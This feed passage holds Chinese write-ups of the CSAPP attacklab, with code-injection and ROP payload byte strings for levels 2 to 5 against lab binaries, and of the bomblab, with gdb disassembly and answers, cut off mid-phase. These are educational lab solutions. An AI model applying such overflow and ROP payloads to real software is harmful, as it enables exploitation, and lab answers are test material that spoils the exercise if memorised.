class="line">retq# 跳转到 touch2</span><br></pre></td></tr></table></figure><p>将上述代码保存为 exec.s，使用以下命令查看指令字节序列：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c exec.s</span><br><span class="line">objdump -d exec.o</span><br></pre></td></tr></table></figure><p>指令字节序列为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure><p><strong>C. CTARGET 的输入字节序列</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="要求-2"><a href="#要求-2" class="headerlink" title="要求"></a>要求</h4><p>针对程序 CTARGET， 修改函数 test 调用 getbuf 的返回地址，使其返回 touch3 函数而非 test。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span> </span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，touch3 会调用函数 hexmatch 以比较输入字符串是否和 cookie 的字符串相同，新的函数会使用并覆盖栈上的数据。</p><h4 id="做法-2"><a href="#做法-2" class="headerlink" title="做法"></a>做法</h4><p>在该实验中需要将 cookie 的字符串保存到栈上，并将其起始地址保存到 %rdi 上。</p><p>解法和 Level 2 类似，但要注意一点，touch3 中的 hexmatch 会使用栈而破坏输入的字节序列，导致 cookie 的字符串序列无效。</p><p>为了避免上述情况发生，与新函数执行相同，先开辟一段新的栈区以保护输入序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea -24(%rsp), %rdi# cookie 字符串地址</span><br><span class="line">sub $0x30, %rsp# 开辟栈区</span><br><span class="line">push $0x4018fa# touch3 地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>使用 <code>gcc -c exec.s</code> 和 <code>objdump -d exec.o</code> 查看指令字节序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">exec.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 8d 7c 24 e8          lea    -0x18(%rsp),%rdi</span><br><span class="line">   5:   48 83 ec 30             sub    $0x30,%rsp</span><br><span class="line">   9:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   e:   c3                      retq</span><br></pre></td></tr></table></figure><p>CTARGET 的输入字节序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 8d 7c 24 e8 48 83 ec</span><br><span class="line">30 68 fa 18 40 00 c3 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><h4 id="要求-3"><a href="#要求-3" class="headerlink" title="要求"></a>要求</h4><p>针对程序 RTARGET，修改函数 test 调用 getbuf 的返回地址，使其返回 touch2 函数而非 test。</p><p>在该实验中，禁止执行栈中的指令，并且栈的地址也会发生变化。因此，Level 1~3 的做法失效了。</p><h4 id="做法-3"><a href="#做法-3" class="headerlink" title="做法"></a>做法</h4><p>在该实验中通过找出已有指令的字节序列作为<strong>工具片段（gadget）</strong>，其原理如下图所示。通过工具片段来解决无法执行栈中指令的问题。</p><img src="/2020/02/19/CSAPP-attacklab/gadget.png" title="[图 3. 工具片段的执行序列]"><p>每个工具片段以 ret(编码 0xc3) 结尾，将工具片段地址保存在栈上，ret 依次解栈来执行下一条工具片段。</p><p>该实现限制了指令集 movq, popq, ret 和 nop。</p><p>该实验的思路比较清晰：通过 popq 从栈中取数据，然后使用将数据保存到相应的寄存器（如 %rdi）即可。</p><p>使用 <code>disas /r getval_142</code> 依次查看每个工具函数的指令序列。</p><p>其中，关键的工具函数有 addval_273 和 addval_219：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function addval_273:</span><br><span class="line">   0x4019a0 &lt;+0&gt;:     8d 87 48 89 c7 c3       lea ,%eax</span><br><span class="line">   0x4019a6 &lt;+6&gt;:     c3      retq</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function addval_219:</span><br><span class="line">   0x4019a7 &lt;+0&gt;:     8d 87 51 73 58 90       lea -0x6fa78caf(%rdi),%eax</span><br><span class="line">   0x4019ad &lt;+6&gt;:     c3      retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在 addval_273 中可以提取指令序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4019a2: 48 89 c7movq %rax, %rdi</span><br><span class="line">0x4019a5: c3retq</span><br></pre></td></tr></table></figure><p>在 addval_219 中可以提取指令序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x4019ab: 58popq %rax</span><br><span class="line">0x4019ac: 90nop</span><br><span class="line">0x4019ad: c3retq</span><br></pre></td></tr></table></figure><p>显然，通过工具片段 0x4019ab 提取 cookie 到 %rax，然后使用 0x4019a2 将 cookie 转移到 %rdi，完成参数构造。</p><p>RTARGET 的输入字节序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3><h4 id="要求-4"><a href="#要求-4" class="headerlink" title="要求"></a>要求</h4><p>针对程序 RTARGET，修改函数 test 调用 getbuf 的返回地址，使其返回 touch3 函数而非 test。</p><p>在该实验中，禁止执行栈中的指令，并且栈的地址也会发生变化。因此，Level 1~3 的做法失效了。</p><h4 id="做法-4"><a href="#做法-4" class="headerlink" title="做法"></a>做法</h4><p>做法与 Level 4 类似，但是需要更多的工具片段，额外需要一条 lea 指令计算 cookie 字符串的地址。</p><p>关键工具函数及提取的工具片段如下，函数顺序表示了执行顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">000027 &lt;addval_219&gt;:</span><br><span class="line">   0x4019a7 &lt;+0&gt;:     8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">   0x4019ad &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019ab: 58             pop %rax</span><br><span class="line">   0x4019ac: 90</span><br><span class="line">   0x4019ad: c3</span><br><span class="line"></span><br><span class="line">0001b2 &lt;addval_487&gt;:</span><br><span class="line">   0x401a40 &lt;+0&gt;:     8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax</span><br><span class="line">   0x401a46 &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401a42: 89 c2          movl %eax, %edx</span><br><span class="line">   0x401a44: 84 c0          tesb %al, %al</span><br><span class="line">   0x401a46: c3             retq</span><br><span class="line"></span><br><span class="line">000196 &lt;getval_159&gt;:</span><br><span class="line">   0x401a33 &lt;+0&gt;:     b8 89 d1 38 c9  mov    $0xc938d189,%eax</span><br><span class="line">   0x401a38 &lt;+5&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401a34: 89 d1          movl %edx, %ecx</span><br><span class="line">   0x401a36: 38 c9          cmpb %cl, %cl</span><br><span class="line">   0x401a38: c3             retq</span><br><span class="line"></span><br><span class="line">000143 &lt;addval_436&gt;:</span><br><span class="line">   0x401a11 &lt;+0&gt;:     8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">   0x401a17 &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401a13: 89 ce          movl %ecx, %esi</span><br><span class="line">   0x401a15: 90             nop</span><br><span class="line">   0x401a16: 90             nop</span><br><span class="line">   0x401a17: c3             retq</span><br><span class="line"></span><br><span class="line">0002b8 &lt;setval_350&gt;:</span><br><span class="line">   0x401aab &lt;+0&gt;:     c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">   0x401ab1 &lt;+6&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x401aad: 48 89 e0mov %rsp, %rax</span><br><span class="line">   0x401ab0: 90</span><br><span class="line">   0x401ab1: c3</span><br><span class="line"></span><br><span class="line">000016 &lt;addval_273&gt;:</span><br><span class="line">   0x4019a0 &lt;+0&gt;:     8d 87 48 89 c7 c3       lea    -0x3c3876b8 (%rdi),%eax</span><br><span class="line">   0x4019a6 &lt;+6&gt;:     c3                      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019a2: 48 89 c7mov %rax, %rdi</span><br><span class="line">   0x4019a5: c3</span><br><span class="line"></span><br><span class="line">0000a2 &lt;add_xy&gt;:</span><br><span class="line">   0x4019d6 &lt;+0&gt;:     48 8d 04 37     lea    (%rdi,%rsi,1),%rax</span><br><span class="line">   0x4019da &lt;+4&gt;:     c3      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019d6: 48 8d 04 37lea (%rdi, %rsi, 1), %rax</span><br><span class="line">   0x4019da: c3</span><br><span class="line"></span><br><span class="line">000016 &lt;addval_273&gt;:</span><br><span class="line">   0x4019a0 &lt;+0&gt;:     8d 87 48 89 c7 c3       lea    -0x3c3876b8 (%rdi),%eax</span><br><span class="line">   0x4019a6 &lt;+6&gt;:     c3                      retq</span><br><span class="line">   # 提取工具片段</span><br><span class="line">   0x4019a2: 48 89 c7mov %rax, %rdi</span><br><span class="line">   0x4019a5: c3</span><br><span class="line"></span><br><span class="line">xxxxxx &lt;touch3&gt;</span><br><span class="line">   0x4018fa</span><br></pre></td></tr></table></figure><p>RTARGET 的输入字节序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">00 11 22 33 44 55 66 77</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在这个实验中，学习利用&lt;strong&gt;缓存溢出（buffer overflow）&lt;/strong&gt;来改变程序的行为
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CSAPP - bomblab</title>
    <link href="http://mcginn7.github.io/2020/02/16/CSAPP-bomblab/"/>
    <id>http://mcginn7.github.io/2020/02/16/CSAPP-bomblab/</id>
    <published>2020-02-16T13:06:08.000Z</published>
    <updated>2020-02-18T02:43:03.399Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装-GDB"><a href="#安装-GDB" class="headerlink" title="安装 GDB"></a>安装 GDB</h2><h3 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h3><p>在 Ubuntu 18.04 LTS 中使用 <code>apt-get install gdb</code> 安装失败。替换使用国内 Ubuntu 的镜像源后安装成功。</p><ol><li><p>首先更新 <code>/etc/apt/sources.list</code>，将该文件内容替换为阿里源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure></li><li><p>运行 <code>apt-get update</code> 和 <code>apt-get upgrade</code> 更新。</p></li><li><p>安装 gdb：<code>apt-get install gdb</code>。</p></li></ol><h3 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h3><p>执行 gdb 调试时，遇到 Error disabling address space randomization 错误，参考 <a href="https://stackoverflow.com/questions/35860527/warning-error-disabling-address-space-randomization-operation-not-permitted" target="_blank" rel="noopener">warning: Error disabling address space randomization: Operation not permitted</a>，在创建 docker 容器时添加 <code>--security-opt seccomp=unconfined</code> 参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --cap-add=SYS_PTRACE --security-opt seccomp=unconfined ubuntu bash</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>调用 <code>disassemble phase_1</code> 反汇编函数 phase_1 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">0x400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">0x400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">0x400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">0x400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">0x400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">0x400efb &lt;+27&gt;:    retq</span><br></pre></td></tr></table></figure><p>显然，该函数调用了函数 <code>strings_not_equal</code>，判断两个字符串是否相同。第一个字符串参数 %rdi  为输入 <code>input</code> 的地址，第二个参数为比较字符串的地址 0x402400。</p><p>在 gdb 中调用 <code>print (char *) 0x402400</code> 输出该地址的字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure><p>因此 bomb 的第 1 组运行参数为上述字符串。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>调用 <code>disassemble phase_2</code> 反汇编函数 phase_2 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0x400efc &lt;+0&gt;:     push   %rbp</span><br><span class="line">0x400efd &lt;+1&gt;:     push   %rbx</span><br><span class="line">0x400efe &lt;+2&gt;:     sub    $0x28,%rsp</span><br><span class="line">0x400f02 &lt;+6&gt;:     mov    %rsp,%rsi</span><br><span class="line">0x400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">0x400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)</span><br><span class="line">0x400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">0x400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">0x400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax</span><br><span class="line">0x400f1a &lt;+30&gt;:    add    %eax,%eax</span><br><span class="line">0x400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)</span><br><span class="line">0x400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">0x400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x400f25 &lt;+41&gt;:    add    $0x4,%rbx</span><br><span class="line">0x400f29 &lt;+45&gt;:    cmp    %rbp,%rbx</span><br><span class="line">0x400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">0x400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">0x400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx</span><br><span class="line">0x400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp</span><br><span class="line">0x400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">0x400f3c &lt;+64&gt;:    add    $0x28,%rsp</span><br><span class="line">0x400f40 &lt;+68&gt;:    pop    %rbx</span><br><span class="line">0x400f41 &lt;+69&gt;:    pop    %rbp</span><br><span class="line">0x400f42 &lt;+70&gt;:    retq</span><br></pre></td></tr></table></figure><p>最先调用了函数 <code>read_six_numbers</code>，其起始地址为 0x40145c，调用 <code>disassemble 0x40145c</code> 反汇编其代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0x40145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">0x401460 &lt;+4&gt;:     mov    %rsi,%rdx</span><br><span class="line">0x401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx</span><br><span class="line">0x401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax</span><br><span class="line">0x40146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">0x401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax</span><br><span class="line">0x401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">0x401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9</span><br><span class="line">0x40147c &lt;+32&gt;:    lea    0x8(%rsi),%r8</span><br><span class="line">0x401480 &lt;+36&gt;:    mov    $0x4025c3,%esi</span><br><span class="line">0x401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">0x40148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x40148f &lt;+51&gt;:    cmp    $0x5,%eax</span><br><span class="line">0x401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">0x401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">0x40149d &lt;+65&gt;:    retq</span><br></pre></td></tr></table></figure><p>先注意该函数调用了 <code>sscanf</code> 函数，其从一个字符串而不是标准输入流读取输入。<code>sscanf</code> 的第二个参数为输入格式，尝试打印其字符串（0x4025c3）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1 = 0x4025c3 &quot;%d %d %d %d %d %d&quot;</span><br></pre></td></tr></table></figure><p>与函数名相应，该函数从输入 <code>input</code> 中读取 6 个整数。</p><p>由于<code>sscanf</code> 参数超过 6 个，前 6 个参数<strong>按序</strong>分别存储于 %edi, %esi, %rdx, %rcx, %r8, %r9，剩余两个参数存储于栈中，其中第 7 个参数位于栈顶。阅读代码可知 6 个整数按序存储于 %rsi, %rsi + 4, …, %rsi + 20。</p><p>0x400f0a 行的代码表示读入的第 1 个数必须等于 1。</p><p>从 0x400f17 到 0x400f2c 的代码表示，*(rbp) = *(rbp - 0x4) * 2，即读入的 6 个整数表示首项为 1 公比为 2 的等比数列： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 2 4 8 16 32</span><br></pre></td></tr></table></figure><p>该序列为 bomb 的第 2 组运行参数。</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>调用 <code>disassemble phase_3</code> 反汇编函数 phase_3 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">0x400f43 &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">0x400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">0x400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">0x400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">0x400f56 &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">0x400f5b &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x400f60 &lt;+29&gt;:    cmp    $0x1,%eax</span><br><span class="line">0x400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">0x400f65 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)</span><br><span class="line">0x400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">0x400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax</span><br><span class="line">0x400f75 &lt;+50&gt;:    jmpq   *0x402470(,%rax,8)</span><br><span class="line">0x400f7c &lt;+57&gt;:    mov    $0xcf,%eax</span><br><span 